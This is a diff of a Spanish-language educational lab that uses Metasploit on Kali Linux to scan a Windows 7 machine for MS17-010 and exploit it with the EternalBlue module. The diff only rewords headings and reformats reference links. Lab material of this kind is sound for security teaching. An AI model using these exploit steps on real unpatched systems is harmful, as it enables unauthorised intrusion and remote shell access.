@@ -11,7 +11,7 @@ Este laboratorio es para fines educativos y su contenido no debe ser utilizado p
 * Máquina objetivo: Windows 7 64bits  
 * Equipo Auditor: Kali Linux 
 
-**Utilizar un scanner para detercar si el equipo es vulnerable a  MS17-010**
+**Utilizar un scanner auxiliar para detercar si el equipo es vulnerable a  MS17-010**
 * Desde Kali Linux Inicie una sesión de terminal y escriba los siguientes comandos:
 ```
 msfconsole
@@ -32,7 +32,7 @@ set RHOSTS “Dirección IP del host windows 7 64bits”
 run
 ```
 ![alt text](./lab01-images/lab01-fig3-msf-console.PNG "Metasploit framework")
-**Exploiting**
+**utilizar un módulo para explotar la vulnerabilidad ms17_010**
 ```
 use exploit/windows/smb/ms17_010_eternalblue ```
 ```
@@ -63,13 +63,9 @@ Shell
 
 **Enlace para mayor información**
 
-```
-https://www.metasploit.com/
-```
-```
-https://www.offensive-security.com/
-metasploit-unleashed/msfconsole-commands/
-```
-```
-https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
-```
+[Sobre Metasploit Framework] (https://www.metasploit.com/)
+
+[Comandos usados en  Measploit Framework] (https://www.offensive-security.com/
+metasploit-unleashed/msfconsole-commands/)
+
+[Fundamentos de meterpreter] (https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
